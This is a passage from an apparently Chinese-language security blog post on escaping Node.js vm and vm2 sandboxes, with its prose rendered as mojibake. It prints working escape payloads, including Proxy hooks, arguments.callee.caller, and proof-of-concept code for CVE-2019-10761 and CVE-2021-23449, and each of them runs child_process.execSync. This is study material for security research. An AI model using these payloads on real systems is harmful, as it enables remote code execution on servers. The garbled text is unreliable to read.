context);console.log(res)\n\næˆ‘ä»¬èƒ½ä¸èƒ½æŠŠthis.toString.constructor('return process')()ä¸­çš„thisæ¢æˆ{}å‘¢ï¼Ÿ {}çš„æ„æ€æ˜¯åœ¨æ²™ç®±å†…å£°æ˜äº†ä¸€ä¸ªå¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªå¯¹è±¡æ˜¯ä¸èƒ½è®¿é—®åˆ°globalä¸‹çš„ã€‚\nå¦‚æœæˆ‘ä»¬å°†thisæ¢æˆmå’Œnä¹Ÿæ˜¯è®¿é—®ä¸åˆ°çš„ï¼Œå› ä¸ºæ•°å­—ï¼Œå­—ç¬¦ä¸²ï¼Œå¸ƒå°”è¿™äº›éƒ½æ˜¯primitiveç±»å‹ï¼Œä»–ä»¬åœ¨ä¼ é€’çš„è¿‡ç¨‹ä¸­æ˜¯å°†å€¼ä¼ é€’è¿‡å»è€Œä¸æ˜¯å¼•ç”¨ï¼ˆç±»ä¼¼äºå‡½æ•°ä¼ é€’å½¢å‚ï¼‰ï¼Œåœ¨æ²™ç›’å†…ä½¿ç”¨çš„mnå·²ç»ä¸æ˜¯åŸæ¥çš„mnäº†ï¼Œæ‰€ä»¥æ— æ³•åˆ©ç”¨ã€‚\næˆ‘ä»¬å°†mnæ”¹æˆå…¶ä»–ç±»å‹å°±å¯ä»¥åˆ©ç”¨äº†ï¼š\n\n0x05 vmæ²™ç®±é€ƒé€¸çš„ä¸€äº›å…¶ä»–æƒ…å†µçŸ¥è¯†æ˜Ÿçƒé‡Œæåˆ°äº†è¿™æ ·çš„æƒ…å†µï¼š\nconst vm = require('vm');const script = `...`;const sandbox = Object.create(null);const context = vm.createContext(sandbox);const res = vm.runInContext(script, context);console.log('Hello ' + res)\n\n\n\næˆ‘ä»¬ç°åœ¨çš„thisä¸ºnullï¼Œå¹¶ä¸”ä¹Ÿæ²¡æœ‰å…¶ä»–å¯ä»¥å¼•ç”¨çš„å¯¹è±¡ï¼Œè¿™æ—¶å€™æƒ³è¦é€ƒé€¸æˆ‘ä»¬è¦ç”¨åˆ°ä¸€ä¸ªå‡½æ•°ä¸­çš„å†…ç½®å¯¹è±¡çš„å±æ€§arguments.callee.callerï¼Œå®ƒå¯ä»¥è¿”å›å‡½æ•°çš„è°ƒç”¨è€…ã€‚\næˆ‘ä»¬ä¸Šé¢æ¼”ç¤ºçš„æ²™ç®±é€ƒé€¸å…¶å®å°±æ˜¯æ‰¾åˆ°ä¸€ä¸ªæ²™ç®±å¤–çš„å¯¹è±¡ï¼Œå¹¶è°ƒç”¨å…¶ä¸­çš„æ–¹æ³•ï¼Œè¿™ç§æƒ…å†µä¸‹ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œæˆ‘ä»¬åªè¦åœ¨æ²™ç®±å†…å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç„¶ååœ¨æ²™ç®±å¤–è°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œé‚£ä¹ˆè¿™ä¸ªå‡½æ•°çš„arguments.callee.callerå°±ä¼šè¿”å›æ²™ç®±å¤–çš„ä¸€ä¸ªå¯¹è±¡ï¼Œæˆ‘ä»¬åœ¨æ²™ç®±å†…å°±å¯ä»¥è¿›è¡Œé€ƒé€¸äº†ã€‚\n\næˆ‘ä»¬åˆ†æä¸€ä¸‹è¿™æ®µä»£ç \nconst vm = require('vm');const script = `(() =&gt; {    const a = {}    a.toString = function () {      const cc = arguments.callee.caller;      const p = (cc.constructor.constructor('return process'))();      return p.mainModule.require('child_process').execSync('whoami').toString()    }    return a  })()`;const sandbox = Object.create(null);const context = new vm.createContext(sandbox);const res = vm.runInContext(script, context);console.log('Hello ' + res)\n\næˆ‘ä»¬åœ¨æ²™ç®±å†…å…ˆåˆ›å»ºäº†ä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶ä¸”å°†è¿™ä¸ªå¯¹è±¡çš„toStringæ–¹æ³•è¿›è¡Œäº†é‡å†™ï¼Œé€šè¿‡arguments.callee.callerè·å¾—åˆ°æ²™ç®±å¤–çš„ä¸€ä¸ªå¯¹è±¡ï¼Œåˆ©ç”¨è¿™ä¸ªå¯¹è±¡çš„æ„é€ å‡½æ•°çš„æ„é€ å‡½æ•°è¿”å›äº†processï¼Œå†è°ƒç”¨processè¿›è¡Œrceï¼Œæ²™ç®±å¤–åœ¨console.logä¸­é€šè¿‡å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼è§¦å‘äº†è¿™ä¸ªé‡å†™åçš„toStringå‡½æ•°ã€‚\nå¦‚æœæ²™ç®±å¤–æ²¡æœ‰æ‰§è¡Œå­—ç¬¦ä¸²çš„ç›¸å…³æ“ä½œæ¥è§¦å‘è¿™ä¸ªtoStringï¼Œå¹¶ä¸”ä¹Ÿæ²¡æœ‰å¯ä»¥ç”¨æ¥è¿›è¡Œæ¶æ„é‡å†™çš„å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨Proxyæ¥åŠ«æŒå±æ€§\nProxy å’Œ Reflect - æ˜é‡‘ (juejin.cn)\n\nconst vm = require(\"vm\");const script = `(() =&gt;{    const a = new Proxy({}, {        get: function(){            const cc = arguments.callee.caller;            const p = (cc.constructor.constructor('return process'))();            return p.mainModule.require('child_process').execSync('whoami').toString();        }    })    return a})()`;const sandbox = Object.create(null);const context = new vm.createContext(sandbox);const res = vm.runInContext(script, context);console.log(res.abc)\n\nè§¦å‘åˆ©ç”¨é“¾çš„é€»è¾‘å°±æ˜¯æˆ‘ä»¬åœ¨get:è¿™ä¸ªé’©å­é‡Œå†™äº†ä¸€ä¸ªæ¶æ„å‡½æ•°ï¼Œå½“æˆ‘ä»¬åœ¨æ²™ç®±å¤–è®¿é—®proxyå¯¹è±¡çš„ä»»æ„å±æ€§ï¼ˆä¸è®ºæ˜¯å¦å­˜åœ¨ï¼‰è¿™ä¸ªé’©å­å°±ä¼šè‡ªåŠ¨è¿è¡Œï¼Œå®ç°äº†rceã€‚\nå¦‚æœæ²™ç®±çš„è¿”å›å€¼è¿”å›çš„æ˜¯æˆ‘ä»¬æ— æ³•åˆ©ç”¨çš„å¯¹è±¡æˆ–è€…æ²¡æœ‰è¿”å›å€¼åº”è¯¥æ€ä¹ˆè¿›è¡Œé€ƒé€¸å‘¢ï¼Ÿ\næˆ‘ä»¬å¯ä»¥å€ŸåŠ©å¼‚å¸¸ï¼Œå°†æ²™ç®±å†…çš„å¯¹è±¡æŠ›å‡ºå»ï¼Œç„¶ååœ¨å¤–éƒ¨è¾“å‡ºï¼š\n\nconst vm = require(\"vm\");const script = `    throw new Proxy({}, {        get: function(){            const cc = arguments.callee.caller;            const p = (cc.constructor.constructor('return process'))();            return p.mainModule.require('child_process').execSync('whoami').toString();        }    })`;try {    vm.runInContext(script, vm.createContext(Object.create(null)));}catch(e) {    console.log(\"error:\" + e) } \n\nè¿™é‡Œæˆ‘ä»¬ç”¨catchæ•è·åˆ°äº†throwå‡ºçš„proxyå¯¹è±¡ï¼Œåœ¨console.logæ—¶ç”±äºå°†å­—ç¬¦ä¸²ä¸å¯¹è±¡æ‹¼æ¥ï¼Œå°†æŠ¥é”™ä¿¡æ¯å’Œrceçš„å›æ˜¾ä¸€èµ·å¸¦äº†å‡ºæ¥ã€‚\n0x06 vm2é€šè¿‡ä¸Šé¢å‡ ä¸ªä¾‹å­å¯ä»¥çœ‹å‡ºæ¥vmæ²™ç®±éš”ç¦»åŠŸèƒ½è¾ƒå¼±ï¼Œæœ‰å¾ˆå¤šé€ƒé€¸çš„æ–¹æ³•ï¼Œæ‰€ä»¥ç¬¬ä¸‰æ–¹åŒ…vm2åœ¨vmçš„åŸºç¡€ä¸Šåšäº†ä¸€äº›ä¼˜åŒ–ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹è¿™äº›ä¼˜åŒ–å…·ä½“æ˜¯æ€ä¹ˆå®ç°çš„ã€‚\nå®‰è£…vm2åŒ…ï¼š\nnpm install vm2\n\næ•´ä¸ªvm2åŒ…ä¸‹æ˜¯è¿™æ ·çš„ç»“æ„ï¼š\n\n\ncli.jså®ç°äº†å¯ä»¥åœ¨å‘½ä»¤è¡Œä¸­è°ƒç”¨vm2 ä¹Ÿå°±æ˜¯binä¸‹çš„vm2ã€‚\n\ncontextify.jså°è£…äº†ä¸‰ä¸ªå¯¹è±¡ï¼šContextify Decontextify propertyDescriptorï¼Œå¹¶ä¸”é’ˆå¯¹globalçš„Bufferç±»è¿›è¡Œäº†ä»£ç†ã€‚\n\nmain.js æ˜¯vm2æ‰§è¡Œçš„å…¥å£ï¼Œå¯¼å‡ºäº†NodeVM VM è¿™ä¸¤ä¸ªæ²™ç®±ç¯å¢ƒï¼Œè¿˜æœ‰ä¸€ä¸ªVMScriptå®é™…ä¸Šæ˜¯å°è£…äº†vm.Scriptã€‚\n\nsandbox.jsé’ˆå¯¹globalçš„ä¸€äº›å‡½æ•°å’Œå˜é‡è¿›è¡Œäº†æ‹¦æˆªï¼Œæ¯”å¦‚setTimeoutï¼ŒsetIntervalç­‰\n\n\nvm2ç›¸æ¯”vmåšå‡ºå¾ˆå¤§çš„æ”¹è¿›ï¼Œå…¶ä¸­ä¹‹ä¸€å°±æ˜¯åˆ©ç”¨äº†es6æ–°å¢çš„proxyç‰¹æ€§ï¼Œä»è€Œä½¿ç”¨é’©å­æ‹¦æˆªå¯¹constructorå’Œ__proto__è¿™äº›å±æ€§çš„è®¿é—®ã€‚\nå…ˆç”¨vm2æ¼”ç¤ºä¸€ä¸‹ï¼š\nconst {VM, VMScript} = require('vm2');const script = new VMScript(\"let a = 2;a;\");console.log((new VM()).run(script));\n\nVMæ˜¯vm2åœ¨vmçš„åŸºç¡€ä¸Šå°è£…çš„ä¸€ä¸ªè™šæ‹Ÿæœºï¼Œæˆ‘ä»¬åªéœ€è¦å®ä¾‹åŒ–åè°ƒç”¨å…¶ä¸­çš„runæ–¹æ³•å°±å¯ä»¥è¿è¡Œä¸€æ®µè„šæœ¬ã€‚\né‚£ä¹ˆvm2åœ¨è¿è¡Œè¿™ä¸¤è¡Œä»£ç æ—¶éƒ½åšäº†ä»€ä¹ˆäº‹ï¼š\n\nå¯ä»¥å‘ç°ç›¸æ¯”äºvmçš„æ²™ç®±ç¯å¢ƒï¼Œvm2æœ€é‡è¦çš„ä¸€æ­¥å°±æ˜¯å¼•å…¥sandbox.jså¹¶é’ˆå¯¹contextåšå°è£…ã€‚\né‚£ä¹ˆvm2å…·ä½“æ˜¯æ€ä¹ˆå®ç°å¯¹contextçš„å°è£…ï¼Ÿ\nvm2å‡ºç°è¿‡å¤šæ¬¡é€ƒé€¸çš„é—®é¢˜ï¼Œæ‰€ä»¥ç°æœ‰çš„ä»£ç è¢«è¿›è¡Œäº†å¤§é‡ä¿®æ”¹ï¼Œä¸ºäº†æ–¹ä¾¿åˆ†æéœ€è¦ä½¿ç”¨è¾ƒè€ç‰ˆæœ¬çš„vm2ï¼Œä½†githubä¸Šè²Œä¼¼å°†3.9ä»¥å‰çš„ç‰ˆæœ¬å…¨éƒ½åˆ é™¤äº†ï¼Œæ‰€ä»¥æˆ‘è¿™é‡Œä¹Ÿæ‰¾ä¸åˆ°å¯¹åº”çš„èµ„æºäº†ï¼Œä»£ç åˆ†æä¹Ÿæ¯”è¾ƒéº»çƒ¦ï¼Œç›´æ¥ç§»æ­¥é“¾æ¥ï¼š\nvm2å®ç°åŸç†åˆ†æ-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)\n0x07 vm2ä¸­çš„æ²™ç®±ç»•è¿‡CVE-2019-10761è¯¥æ¼æ´è¦æ±‚vm2ç‰ˆæœ¬&lt;=3.6.10\n\"use strict\";const {VM} = require('vm2');const untrusted = `const f = Buffer.prototype.write;const ft = {\t\tlength: 10,\t\tutf8Write(){\t\t\t\t\t}}function r(i){\tvar x = 0;\ttry{\t\tx = r(i);\t}catch(e){}\tif(typeof(x)!=='number')\t\treturn x;\tif(x!==i)\t\treturn x+1;\ttry{\t\tf.call(ft);\t}catch(e){\t\treturn e;\t}\treturn null;}var i=1;while(1){\ttry{\t\ti=r(i).constructor.constructor(\"return process\")();\t\tbreak;\t}catch(x){\t\ti++;\t}}i.mainModule.require(\"child_process\").execSync(\"whoami\").toString()`;try{\tconsole.log(new VM().run(untrusted));}catch(x){\tconsole.log(x);}\n\nè¿™ä¸ªé“¾å­åœ¨pç‰›çš„çŸ¥è¯†æ˜Ÿçƒä¸Šæœ‰ï¼Œå¾ˆæŠ½è±¡ï¼Œæ²™ç®±é€ƒé€¸è¯´åˆ°åº•å°±æ˜¯è¦ä»æ²™ç®±å¤–è·å–ä¸€ä¸ªå¯¹è±¡ï¼Œç„¶åè·å¾—è¿™ä¸ªå¯¹è±¡çš„constructorå±æ€§ï¼Œè¿™æ¡é“¾å­è·å–æ²™ç®±å¤–å¯¹è±¡çš„æ–¹æ³•æ˜¯ åœ¨æ²™ç®±å†…ä¸æ–­é€’å½’ä¸€ä¸ªå‡½æ•°ï¼Œå½“é€’å½’æ¬¡æ•°è¶…è¿‡å½“å‰ç¯å¢ƒçš„æœ€å¤§å€¼æ—¶ï¼Œæˆ‘ä»¬æ­£å¥½è°ƒç”¨æ²™ç®±å¤–çš„å‡½æ•°ï¼Œå°±ä¼šå¯¼è‡´æ²™ç®±å¤–çš„è°ƒç”¨æ ˆè¢«çˆ†æ‰ï¼Œæˆ‘ä»¬åœ¨æ²™ç®±å†…catchè¿™ä¸ªå¼‚å¸¸å¯¹è±¡ï¼Œå°±æ‹¿åˆ°äº†ä¸€ä¸ªæ²™ç®±å¤–çš„å¯¹è±¡ã€‚ä¸¾ä¸ªä¾‹å­ï¼š\nå‡è®¾å½“å‰ç¯å¢ƒä¸‹æœ€å¤§é€’å½’å€¼ä¸º1000ï¼Œæˆ‘ä»¬é€šè¿‡ç¨‹åºæ§åˆ¶é€’å½’999æ¬¡ï¼ˆæ³¨æ„è¿™é‡Œè¯´çš„é€’å½’å€¼ä¸æ˜¯ä¸€ç›´è°ƒç”¨åŒä¸€ä¸ªå‡½æ•°çš„æœ€å¤§å€¼ï¼Œè€Œæ˜¯å•æ¬¡ç¨‹åºå†…è°ƒç”¨å‡½æ•°æ¬¡æ•°çš„æœ€å¤§å€¼ï¼Œä¹Ÿå°±æ˜¯è°ƒç”¨æ ˆçš„æœ€å¤§å€¼ï¼‰ï¼š\nr(i);      // è¯¥å‡½æ•°é€’å½’999æ¬¡f.call(ft);    // é€’å½’åˆ°ç¬¬1000æ¬¡æ—¶è°ƒç”¨fè¿™ä¸ªå‡½æ•°ï¼Œfä¸ºBuffer.prototype.writeï¼Œå°±æ˜¯ä¸‹é¢å›¾ç‰‡çš„è¿™ä¸ªå‡½æ•°this.utf8Write()   // é€’å½’åˆ°1001æ¬¡æ—¶ä¸ºè¯¥å‡½æ•°ï¼Œæ˜¯ä¸€ä¸ªå¤–éƒ¨å‡½æ•°ï¼Œæ‰€ä»¥çˆ†æ ˆæ—¶æ•æ‰çš„å¼‚å¸¸ä¹Ÿæ˜¯æ²™ç®±å¤–ï¼Œä»è€Œè¿”å›äº†ä¸€ä¸ªæ²™ç®±\t\t\t\t\tå¤–çš„å¼‚å¸¸å¯¹è±¡\n\n\nCVE-2021-23449 è¿™ä¸ªæ¼æ´åœ¨snykè§£é‡Šæ˜¯åŸå‹é“¾æ±¡æŸ“å¯¼è‡´çš„æ²™ç®±é€ƒé€¸ï¼Œä½†pç‰›åœ¨çŸ¥è¯†æ˜Ÿçƒé‡Œå‘äº†å…¶å®æ˜¯å¦å¤–çš„åŸå› \nSandbox Bypass in vm2 | CVE-2021-23449 | Snyk \npocï¼š\nlet res = import('./foo.js')res.toString.constructor(\"return this\")().process.mainModule.require(\"child_process\").execSync(\"whoami\").toString();\n\nimport()åœ¨JavaScriptä¸­æ˜¯ä¸€ä¸ªè¯­æ³•ç»“æ„ï¼Œä¸æ˜¯å‡½æ•°ï¼Œæ²¡æ³•é€šè¿‡ä¹‹å‰å¯¹requireè¿™ç§å‡½æ•°å¤„ç†ç›¸åŒçš„æ–¹æ³•æ¥å¤„ç†å®ƒï¼Œå¯¼è‡´å®é™…ä¸Šæˆ‘ä»¬è°ƒç”¨import()çš„ç»“æœå®é™…ä¸Šæ˜¯æ²¡æœ‰ç»è¿‡æ²™ç®±çš„ï¼Œæ˜¯ä¸€ä¸ªå¤–éƒ¨å˜é‡ã€‚ æˆ‘ä»¬å†è·å–è¿™ä¸ªå˜é‡çš„å±æ€§å³å¯ç»•è¿‡æ²™ç®±ã€‚ vm2å¯¹æ­¤çš„ä¿®å¤æ–¹æ³•ä¹Ÿå¾ˆç²—ç³™ï¼Œæ­£åˆ™åŒ¹é…å¹¶æ›¿æ¢äº†\\bimport\\bå…³é”®å­—ï¼Œåœ¨ç¼–è¯‘å¤±è´¥çš„æ—¶å€™ï¼ŒæŠ¥Dynamic Import not supportedé”™è¯¯ã€‚\nçŸ¥è¯†æ˜Ÿçƒä¸Šçš„å¦å¤–ä¸€ä¸ªtrickSymbol = {  get toStringTag(){    throw f=&gt;f.constructor(\"return process\")()  }};try{  Buffer.from(new Map());}catch(f){  Symbol = {};  f(()=&gt;{}).mainModule.require(\"child_process\").execSync(\"whoami\").toString();}\n\nåœ¨vm2çš„åŸç†ä¸­æåˆ°vm2ä¼šä¸ºå¯¹è±¡é…ç½®ä»£ç†å¹¶åˆå§‹åŒ–ï¼Œå¦‚æœå¯¹è±¡æ˜¯ä»¥ä¸‹ç±»å‹ï¼š\n\nå°±ä¼šreturn Decontextify.instance å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¸­ç”¨åˆ°äº†Symbolå…¨å±€å¯¹è±¡ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åŠ«æŒSymbolå¯¹è±¡çš„getterå¹¶æŠ›å‡ºå¼‚å¸¸ï¼Œå†åœ¨æ²™ç®±å†…æ‹¿åˆ°è¿™ä¸ªå¼‚å¸¸å¯¹è±¡å°±å¯ä»¥äº†\n\n","categories":["WebSec"],"tags":["NodeJs"]}]